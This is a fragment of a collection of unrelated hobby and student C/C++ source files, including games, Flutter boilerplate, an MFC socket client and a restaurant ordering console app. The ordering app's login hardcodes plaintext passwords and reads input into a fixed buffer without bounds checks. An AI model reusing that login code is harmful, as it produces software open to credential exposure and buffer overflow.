true;\n};\n// PIERWSZY ETAP\nvoid rysujPierwszy(SDL_Surface* screen, Platform platforms_one[PLATFORMS_ONE], SDL_Surface* drabina, SDL_Surface* flaga, SDL_Surface* ksiezniczka, SDL_Surface* beczka, Uint32 zielony, Uint32 czerwony) {\n\n\tfor (int i = 0; i < PLATFORMS_ONE; i++) {\n\t\tDrawRectangle(screen, platforms_one[i].rect.x, platforms_one[i].rect.y, platforms_one[i].rect.w, platforms_one[i].rect.h, zielony, czerwony);\n\t}\n\n\t// DRABINA\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 50);\n\tDrawSurface(screen, drabina, 100, SCREEN_HEIGHT - 120);\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 190);\n\tDrawSurface(screen, drabina, 100, SCREEN_HEIGHT - 260);\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 330)",
    "#include <conio.h> // for _kbhit and _getch\r\n#include <Windows.h> // for sleep \r\n#include \"game.h\"\r\n#include <iostream>\r\n#include \"general.h\"\r\n\r\n\r\nint main()\r\n{\r\n    //TETRIS opening logo\r\n    std::cout << \" /$$$$$$$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$  /$$$$$$  /$$$$$$ \" << std::endl;\r\n    std::cout << \"|__  $$__/| $$_____/|__  $$__/| $$__  $$|_  $$_/ /$$__  $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$         | $$   | $$  \\\\ $$  | $$  | $$  \\\\__/\" << std::endl;\r\n    std::cout << \"   | $$   | $$$$$      | $$   | $$$$$$$/  | $$  |  $$$$$$ \" << std::endl;\r\n    std::cout << \"   | $$   | $$__/      | $$   | $$__  $$  | $$   \\\\____  $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$         | $$   | $$  \\\\ $$  | $$   /$$  \\\\ $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$$$$$$$   | $$   | $$  | $$ /$$$$$$|  $$$$$$/\" << std::endl;\r\n    std::cout << \"   |__/   |________/   |__/   |__/  |__/|______/ \\\\______/ \" << std::endl;\r\n\r\n    Sleep(1500);\r\n    clear_screen();\r\n\r\n   \r\n\tGame newGame;  \r\n    //game status returns true when the player want to quit the game\r\n    while (!newGame.getGameStatus()) \r\n    { \r\n\t    newGame.menu((int)gameOption::STARTGAME);\r\n    }\r\n\r\n\treturn 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flavors\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../include/row_input_handle.h\"\n\n\nbool is_char_on_pos(const std::string &src, std::string::size_type pos, char next_ch)\n{\n    if(pos >= 0 && pos < src.length())\n    {\n        if(src.at(pos) == next_ch)\n        {\n            return true;\n        }\n    }\n    return false;\n}\n\nstatic std::map<std::string::size_type, std::string::size_type> find_matched_quotes(\n        const std::string &src)\n{\n    std::map<std::string::size_type, std::string::size_type> quotes_positions;\n    bool is_quoted = false;\n    std::string::size_type opening_quote = std::string::npos;\n    for(std::string::size_type pos = 0; pos < src.length(); ++pos)\n    {\n        const char &ch = src[pos];\n        if(ch == '\"' && !is_char_on_pos(src, pos - 1, '\\\\'))\n        {\n            if(!is_quoted)\n            {\n                is_quoted = true;\n                opening_quote = pos;\n            }\n            else\n            {\n                is_quoted = false;\n                quotes_positions.insert(std::make_pair(opening_quote, pos)); \n                opening_quote = std::string::npos;\n            }\n        }\n        // unmatched quote case is not considered an error in splitting input.\n        // this error is handled later (handling it now can break the order of execution)\n    }\n    // in case of unmatched quote in the end it cannot be inserted inside loop,\n    // so it is done aftwerwards\n    if(is_quoted)\n    {\n        quotes_positions.insert(std::make_pair(opening_quote, \n                    std::string::npos));\n    }\n    return quotes_positions;\n}\n// function to check if passed position inside one of the ranges provided\n// in map of indexes\nbool is_pos_quoted(const std::string &src, std::string::size_type pos)\n{\n    std::map<std::string::size_type, std::string::size_type> quotes_map = \n        find_matched_quotes(src);\n    \n    for(const std::pair<const std::string::size_type, std::string::size_type> \n            &range_points : quotes_map)\n    {\n        if(range_points.first > pos)\n        {\n            return false;\n        }\n        // first property is the begining of the range, second is the end\n        if(range_points.first < pos && pos < range_points.second)\n        {\n            return true;\n        }\n    }\n    return false;\n}\n\n// returns position of the last occurance of req_str outside quotes\nstd::string::size_type reverse_find_symbol_position(const std::string &src, std::string req_str)\n{\n    std::string::size_type start_pos = src.rfind(req_str);\n    while(start_pos != std::string::npos)\n    {\n        if(!is_pos_quoted(src, start_pos))\n        {\n            // unquoted bracket is found\n            break;\n        }\n        else\n        {\n            if(start_pos != 1)\n            {\n                start_pos--;\n            }\n            else\n            {\n                // if there is no unquoted bracket\n                start_pos = std::string::npos;\n                break;\n            }\n        }\n        start_pos = src.rfind(req_str, start_pos);\n    }\n    return start_pos;\n}\n\n\n// returns position of the first occurance of req_str outside quotes\nstd::string::size_type find_symbol_position(const std::string &src, std::string req_str)\n{\n    std::string::size_type start_pos = src.find(req_str);\n    while(start_pos != std::string::npos)\n    {\n        if(!is_pos_quoted(src, start_pos))\n        {\n            // unquoted bracket is found\n            break;\n        }\n        else\n        {\n            if(start_pos != src.length() - 1)\n            {\n                start_pos++;\n            }\n            else\n            {\n                // if there is no unquoted bracket\n                start_pos = std::string::npos;\n                break;\n            }\n        }\n        start_pos = src.find(req_str, start_pos);\n    }\n    return start_pos;\n}\n\n// Popes a substring out of a passed string, according to given positions \n// Changes src string. Returns poped out string\nstd::string pop_substr(std::string &src, std::string::size_type start_pos, \n        std::string::size_type end_pos)\n{\n    // Brackets are deleted in src and results\n    std::string result = src.substr(start_pos, end_pos - start_pos + 1);\n    // slices of src excluding text in brackets are stored together\n    std::string new_src = src.substr(0, start_pos);\n    new_src += src.substr(end_pos + 1, src.length() - end_pos - 1);\n    // brackets and text inside them are deleted\n    src = new_src;\n    return result;\n}\n",
    "#include \"studentRecord.h\"\n#include \"not_found_err.h\"\n\n// constructor with default values\nStudentRecord::StudentRecord() {\n  this->id = 0;\n  this->name = \"INVALID\";\n  this->age = 0;\n}\n\n// overloaded constructor with id specified\nStudentRecord::StudentRecord(int id) {\n  this->id = id;\n  this->name = \"INVALID\";\n  this->age = 0;\n}\n\n// overloaded constructor with id and name specified\nStudentRecord::StudentRecord(int id, std::string name) {\n  this->id = id;\n  this->name = name;\n  this->age = 0;\n}\n\n// overloaded constructor with id, name and age specified\nStudentRecord::StudentRecord(int id, std::string name, int age) {\n  this->id = id;\n  this->name = name;\n  this->age = age;\n}\n\n// create a student record and push back the pointer to the vector in argument\n// function is > 80 chars, but I dunno how to make it look good split...\nvoid StudentRecord::addRecord(int id, std::string name, int age, std::vector<StudentRecord*>& allRecords) {\n  StudentRecord* record = new StudentRecord(id, name, age);\n  allRecords.push_back(record);\n\n}\n\n// find and fetch a specific record and return the pointer to the record in\n// function is > 80 chars, but I dunno how to make it look good split...\nStudentRecord* StudentRecord::fetchRecord(int id, std::vector<StudentRecord*>& allRecords) {\n  for (auto i : allRecords) {\n    if (i->id == id)\n      return i;\n  }\n  // throw if not found\n  throw (not_found_err());\n}\n\n//--------------getters------------------------\n\nint StudentRecord::getId() {\n  return this->id;\n}\n\nstd::string StudentRecord::getName() {\n  return this->name;\n}\n\nint StudentRecord::getAge() {\n  return this->age;\n}",
    "#include \"mfc.h\"\n\n\nMyApp app;\n\nBOOL MyApp::InitInstance()\n{\n    MyFrame* frame = new MyFrame;\n    frame->ShowWindow(SW_SHOWNORMAL);\n    frame->UpdateWindow();\n\n    m_pMainWnd = frame;\n\n    return TRUE;\n}\n\n#define WM_UPDATE_MESSAGE_BOX (WM_APP + 1)\n\nBEGIN_MESSAGE_MAP(MyFrame, CFrameWnd)\n                    ON_WM_CREATE()\n                    ON_BN_CLICKED(1001, &MyFrame::OnBnClickedConnect)\n                    ON_BN_CLICKED(1002, &MyFrame::OnBnClickedDisconnect)\n                    ON_MESSAGE(WM_UPDATE_MESSAGE_BOX, &MyFrame::OnUpdateMessageBox)\nEND_MESSAGE_MAP()\n\nLRESULT MyFrame::OnUpdateMessageBox(WPARAM wParam, LPARAM lParam)\n{\n    CString* pStr = reinterpret_cast<CString*>(lParam);\n//    m_messageBox.SetWindowText(*pStr);\n\n    // \u786e\u4fdd\u6211\u4eec\u5728 UI \u7ebf\u7a0b\u4e2d\u64cd\u4f5c UI \u63a7\u4ef6\n    if (m_messageBox.GetSafeHwnd())\n    {\n        int nLength = m_messageBox.GetWindowTextLength();\n        m_messageBox.SetSel(nLength, nLength);  // \u5c06\u63d2\u5165\u70b9\u79fb\u81f3\u6587\u672c\u672b\u5c3e\n        m_messageBox.ReplaceSel(*pStr);           // \u63d2\u5165\u6587\u672c\n        m_messageBox.ReplaceSel(_T(\"\\r\\n\"));    // \u6dfb\u52a0\u65b0\u884c\n    }\n\n    delete pStr;  // \u91ca\u653e\u4f20\u9012\u8fc7\u6765\u7684\u5b57\u7b26\u4e32\n\n    return 0;\n}\n\nMyFrame* pFrame = nullptr;\n\nMyFrame::MyFrame() {\n    pFrame = reinterpret_cast<MyFrame*>(this);\n    Create(NULL, TEXT(\"mfc\"));\n    m_bConnected = false;\n}\n\nint MyFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)\n{\n    if (CFrameWnd::OnCreate(lpCreateStruct) == -1)\n        return -1;\n\n    m_ipAddressBox.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, CRect(10, 10, 200, 35), this, 1002);\n    m_ipAddressBox.SetWindowTextW(TEXT(\"127.0.0.1\"));\n    m_portBox.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, CRect(10, 50, 200, 75), this, 1003);\n    m_portBox.SetWindowTextW(TEXT(\"1234\"));\n    m_messageBox.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOVSCROLL | ES_MULTILINE, CRect(10, 90, 200, 200), this, 1004);\n    m_connectButton.Create(TEXT(\"Connect\"), WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, CRect(210, 10, 310, 35), this, 1001);\n\n    return 0;\n}\n\nUINT AFX_CDECL BackgroundThread(LPVOID pParam)\n{\n    SOCKET sockHandle = (SOCKET)pParam;\n    CAsyncSocket socket;\n    socket.Attach(sockHandle);\n\n    char buffer[1024];\n    int bytesRead;\n\n    while (true)\n    {\n        int bytesRead = socket.Receive(buffer, sizeof(buffer) - 1);\n        if (bytesRead > 0)\n        {\n            buffer[bytesRead] = '\\0';\n            CString* pStrReceived = new CString(buffer);\n            pFrame->PostMessage(WM_UPDATE_MESSAGE_BOX, 0, reinterpret_cast<LPARAM>(pStrReceived));\n        }\n        else if (bytesRead == SOCKET_ERROR) {\n            int nError = socket.GetLastError();\n            if (nError == WSAEWOULDBLOCK) {\n                // \u975e\u963b\u585e\u6a21\u5f0f\u4e0b\u6ca1\u6709\u6570\u636e\u53ef\u8bfb\n            } else {\n                break;\n                // \u5904\u7406\u5176\u4ed6\u9519\u8bef\n            }\n        }\n    }\n\n    // \u65ad\u5f00\u8fde\u63a5\u5e76\u6e05\u7406\n    socket.Close();\n    return 0;\n}\n\n\n\nvoid MyFrame::OnBnClickedConnect()\n{\n    if (m_bConnected) return;\n\n    CString ipAddress, port;\n    m_ipAddressBox.GetWindowText(ipAddress);\n    m_portBox.GetWindowText(port);\n    int portNumber = _ttoi(port);\n\n    if (!AfxSocketInit())\n    {\n        AfxMessageBox(TEXT(\"Socket library initialization failed!\"));\n        return;\n    }\n\n    if (!m_clientSocket.Create())\n    {\n        AfxMessageBox(TEXT(\"Socket creation failed!\"));\n        return;\n    }\n\n    if (!m_clientSocket.Connect(ipAddress, portNumber))\n    {\n        m_messageBox.SetWindowText(TEXT(\"Failed to connect\"));\n        return;\n    }\n\n    m_messageBox.SetWindowText(TEXT(\"Connected to server\"));\n\n    m_bConnected = true;\n\n    // \u5957\u63a5\u5b57\u5df2\u8fde\u63a5\uff0c\u73b0\u5728\u4ece\u8fd9\u4e2a\u5957\u63a5\u5b57\u5206\u79bb\u51fa\u53e5\u67c4\n    SOCKET sockHandle = m_clientSocket.Detach();\n    // \u5c06\u53e5\u67c4\u4f20\u9012\u7ed9\u540e\u53f0\u7ebf\u7a0b\u5904\u7406\n    m_pReceiverThread = AfxBeginThread(BackgroundThread, (LPVOID)sockHandle);\n\n}\n\nvoid MyFrame::OnBnClickedDisconnect()\n{\n    if (!m_bConnected) return;\n\n    m_clientSocket.Close();\n    m_bConnected = false;\n    m_messageBox.SetWindowText(TEXT(\"Disconnected\"));\n}\n",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <cstdlib>\n#include <ctime>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Equipo {\n    string nombre;\n    int puntos;\n    int golesMarcados;\n    bool eliminado;\n};\n\nvoid jugarPartido(Equipo &equipoLocal, Equipo &equipoVisitante, bool faseEliminatoria) {\n    equipoLocal.golesMarcados = rand() % 5;\n    equipoVisitante.golesMarcados = rand() % 5;\n\n    // Imprimir el nombre del equipo local y los resultados con el equipo visitante\n    cout << equipoLocal.nombre << \" \" << equipoLocal.golesMarcados << \" - \" << equipoVisitante.golesMarcados << \"   - \" << equipoVisitante.nombre << endl;\n\n    if (faseEliminatoria) {\n        if (equipoLocal.golesMarcados == equipoVisitante.golesMarcados) {\n            // Si hay empate en fase de eliminaci\u00f3n, se resuelve por la cantidad de goles en la tanda de penales\n            int golesPenalesLocal = rand() % 6; // Genera un n\u00famero aleatorio entre 0 y 5\n            int golesPenalesVisitante = rand() % 6;\n\n            // Mostrar los resultados de la tanda de penales\n            cout << \"\u00a1Vamos a la tanda de penales!\\n\";\n            cout << \"Goles en penales: \" << equipoLocal.nombre << \" \" << golesPenalesLocal << \" - \" << golesPenalesVisitante << \" \" << equipoVisitante.nombre << endl;\n\n            if (golesPenalesLocal > golesPenalesVisitante) {\n                equipoLocal.puntos += 2; // Se asignan dos puntos por ganar en penales\n                equipoVisitante.eliminado = true;\n            } else {\n                equipoVisitante.puntos += 2;\n                equipoLocal.eliminado = true;\n            }\n        } else {\n            // No hay empate, se determina el ganador normalmente\n            if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n                equipoLocal.puntos += 3;\n                equipoVisitante.eliminado = true;\n            } else {\n                equipoVisitante.puntos += 3;\n                equipoLocal.eliminado = true;\n            }\n        }\n    } else {\n        // No es fase de eliminaci\u00f3n, solo se actualizan los puntos\n        if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n            equipoLocal.puntos += 3;\n        } else if (equipoLocal.golesMarcados < equipoVisitante.golesMarcados) {\n            equipoVisitante.puntos += 3;\n        } else {\n            equipoLocal.puntos += 1;\n            equipoVisitante.puntos += 1;\n        }\n    }\n}\n\nvoid simularFaseGrupos(vector<vector<Equipo>> &grupos) {\n    for (size_t i = 0; i < grupos.size(); ++i) {\n        cout << \"---- Grupo \" << (i + 1) << \" ----\\n\";\n\n        int numEquipos = grupos[i].size();\n\n        // Asegurar que cada equipo juegue contra todos los dem\u00e1s equipos del grupo\n        for (int j = 0; j < numEquipos; ++j) {\n            for (int k = j + 1; k < numEquipos; ++k) {\n                jugarPartido(grupos[i][j], grupos[i][k], false); // No es fase de eliminaci\u00f3n\n            }\n        }\n\n        // Ordenar los equipos por puntos\n        sort(grupos[i].begin(), grupos[i].end(), [](const Equipo &a, const Equipo &b) {\n            return a.puntos > b.puntos;\n        });\n\n        cout << \"\\nTabla de posiciones del grupo \" << (i + 1) << \"\\n\";\n        cout << \"Equipo\\t\\tPuntos\\n\";\n        for (const auto &equipo : grupos[i]) {\n            cout << equipo.nombre << \"\\t\\t\" << equipo.puntos << \"\\n\";\n        }\n        cout << \"------------------------\\n\\n\";\n    }\n}\n\nvoid simularEliminatorias(vector<Equipo> &equipos, const string &nombreRonda, bool faseEliminatoria) {\n    cout << \"\\n  \" << nombreRonda << \"   \\n\";\n\n    // Shuffle de los equipos para enfrentamientos m\u00e1s aleatorios\n    random_shuffle(equipos.begin(), equipos.end());\n\n    for (int i = 0; i < equipos.size(); i += 2) {\n        if (!equipos[i].eliminado && !equipos[i + 1].eliminado) {\n            jugarPartido(equipos[i], equipos[i + 1], faseEliminatoria);\n        }\n    }\n}\n\nvoid generarGrupos(vector<Equipo> &equipos, vector<vector<Equipo>> &grupos) {\n    int numGrupos = equipos.size() / 4;\n    grupos.resize(numGrupos);\n\n    for (int i = 0; i < numGrupos; ++i) {\n        // Ordenar equipos por puntos y luego seleccionar los dos primeros para pasar a cuartos de final\n        sort(equipos.begin() + i * 4, equipos.begin() + (i + 1) * 4, [](const Equipo &a, const Equipo &b) {\n            return a.puntos > b.puntos;\n        });\n\n        grupos[i] = vector<Equipo>(equipos.begin() + i * 4, equipos.begin() + (i + 1) * 4);\n    }\n}\n\nvoid simularCopaAmerica() {\n    srand(time(0));\n\n    vector<Equipo> equipos;\n\n    ifstream archivoEquipos(\"equipos.txt\");\n\n    if (!archivoEquipos.is_open()) {\n        cerr << \"No se pudo abrir el archivo de equipos\" << endl;\n        return;\n    }\n\n    string nombreEquipo;\n    while (getline(archivoEquipos, nombreEquipo)) {\n        equipos.push_back({nombreEquipo, 0, 0, false});\n    }\n\n    archivoEquipos.close();\n\n    vector<vector<Equipo>> grupos;\n    generarGrupos(equipos, grupos);\n\n    // Simulaci\u00f3n de la fase de grupos\n    simularFas",
    "#include <iostream>\r\n#include <string.h>\r\n#include <conio.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nvoid menu();\r\nvoid order();\r\n\r\nint main(void){\r\n\t\r\n\tchar username[10], password[8], x;\r\n\tint i;\r\n\tcout<<\"---------------------------------\"<<endl;\r\n\tcout<<\"--------------LOGIN--------------\"<<endl;\r\n\tcout<<\"---------------------------------\"<<endl;\r\n\tcout << \"Username:\";\r\n\tcin >> username;\r\n\tcout << \"Password:\";\r\n\t\t\r\n\tfor (i = 0;;){\r\n\tx = getch();\r\n\t\r\n\tif((x >='a' && x <= 'z') || (x >='A' && x <='Z') || (x >='0' && x <= '9')){\r\n\t\tpassword[i] = x;\r\n\t\ti++;\r\n\t\tcout << \"*\";\r\n\t\t}\r\n\t\t\r\n\telse if(x =='\\b' && i >= 1){\r\n\t\tcout << \"\\b \\b\";\r\n\t\ti--;\r\n\t\t}\r\n\t\t\r\n\telse if(x =='\\r'){\r\n\t\tpassword[i]='\\0';\r\n\t\tbreak;\r\n\t\t}\r\n}\r\n\r\n\t\r\n\tif (!strcmp(username, \"Keenan\") && !strcmp(password, \"pa55w0rd\")){\r\n\tcout << \"\\nAccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\t\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\t\r\n\telse if(!strcmp(username, \"Thomas\") && !strcmp(password, \"Lizares\")){\r\n\tcout << \"\\nAcccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\t\r\n\telse if(!strcmp(username, \"Burger\") && !strcmp(password, \"Town69\")){\r\n\tcout << \"\\nAcccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\t\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\r\nelse{\r\n\tcout << \"\\nAccess Denied...\";\r\n}\r\n}\r\nvoid menu(){\r\n   \tcout<<\"                        |\\ /| /|_/|\"<<endl;\r\n\tcout<<\"                      |\\||-|\\||-/|/|\"<<endl;  \r\n\tcout<<\"                       \\\\|\\|//||///\"<<endl;  \r\n\tcout<<\"      _..----.._       |\\/\\||//||||\"<<endl;  \r\n\tcout<<\"    .'     o    '.     |||\\\\|/\\\\ ||\"<<endl;  \r\n\tcout<<\"   /   o       o  \\    | './\\_/.' |\"<<endl;  \r\n\tcout<<\"  |o        o     o|   |          |\"<<endl;  \r\n\tcout<<\"  /'-.._o     __.-'\\   |          |\"<<endl;  \r\n\tcout<<\"  \\      `````     /   |          |\"<<endl;  \r\n\tcout<<\"  |``--........--'`|    '.______.'\"<<endl;  \r\n\tcout<<\"   \\              /\"<<endl;  \r\n\tcout<<\"    `'----------'`\"<<endl;  \r\n\tcout<<\"---------------------------------------------------\\n\"<<endl;\r\n\tcout<<\"--------------WELCOME TO BURGER TOWN!--------------\\n\"<<endl;\r\n\tcout<<\"---------------------------------------------------\\n\"<<endl;\r\n\t\r\n\tcout<<\"\t\t\t---MENU---\t\t\t\t\t\t\\n\";\r\n\tcout<<\"\t\t\t-BURGERS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(1)141 Special (Cheeseburger)\t\t-\tP125\\n\";\r\n\tcout<<\"(2)141 Deluxe (Double Cheeseburger)\t-\tP155\\n\";\r\n\tcout<<\"(3)The 75th (Quarter pounder burger)\t-\tP145\\n\";\r\n\tcout<<\"(4)Gulag Shower (Fish Fillet Burger)\t-\tP155\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-PIZZAS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(5)Bacon Machine Pizza\t\t\t-\tP250\\n\";\r\n\tcout<<\"(6)Foley's Cheese Pizza\t\t\t-\tP255\\n\";\r\n\tcout<<\"(7)Pepperoni Pizza\t\t\t-\tP250\\n\";\r\n\tcout<<\"(8)J. Allen's Hawaiian Pizza \t\t-\tP285\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-MAINS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(9)Shepherd's Steak\t\t\t-\tP175\\n\";\r\n\tcout<<\"(10)Nikolai's Rib-eye\t\t\t-\tP165\\n\";\r\n\tcout<<\"(11)Dunn's Chicken and Rice\t\t-\tP110\\n\";\r\n\tcout<<\"(12)Wade's demise (Grilled Pork Chops)\t-\tP130\\n\";\r\n\tcout<<\"(13)Gary Sanderson's Spaghetti \t\t-\tP85\\n\";\r\n\tcout<<\"(14)8 pcs Chicken Nuggets\t\t-\tP105\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-ADD-ONS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(15)Extra rice\t\t\t\t-\tP25\\n\";\r\n\tcout<<\"(16)Fries\t\t\t\t-\tP35\\n\";\r\n\r\n\tcout<<\"\\n\t\t\t-DRINKS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(17)Bottled Water\t\t\t-\tP20\\n\";\r\n\tcout<<\"(18)Iced Tea\t\t\t\t-\tP35\\n\";\r\n\tcout<<\"(19)Lemonade\t\t\t\t-\tP30\\n\";\r\n\tcout<<\"(20)Chocolate Milkshake\t\t\t-\tP95\\n\";\r\n\t\r\n}\r\nvoid order(){\r\n\tint option, count=0, choice[100], quantity[100], discount;\r\n\tfloat total, payment, change, temporary[100];\r\n\t\r\n\tcout<<\"---------------------------------------------------\\n\";\r\n\tcout<<\"\t\t    -OPTIONS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"---------------------------------------------------\\n\";\r\n\tcout<<\"(1) Order\\n\";\r\n\tcout<<\"(2) Exit\\n\";\r\n\t\r\nwhile (option !=1 && option !=2){\r\n\tcout << \"Enter an Option:\";\r\n\tcin >> option;\r\n}\r\n\tif (option == 1){\r\n\t\r\n\twhile (choice[count]!= 21){\r\n\tcout << \"\\nChoice (Item Number):\";\r\n\tcin >> choice[count];\r\n\r\n\t\r\n\tif (choice[count] == 1){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 125;\r\n\t\ttemporary[count] = quantity[count] * 125;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\r\n\t\tcount += 1;\t\t\r\n\t}\r\n\t\telse if (choice[count] == 2){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 155;\r\n\t\ttemporary[count] = quantity[count] * 155;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 3){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 145;\r\n\t\ttemporary[count] = quantity[count] * 145;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 4){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 155;\r\n\t\ttemporary[count] = quantity[count] * 155;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 5){\r\n\t\tcout << \"",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  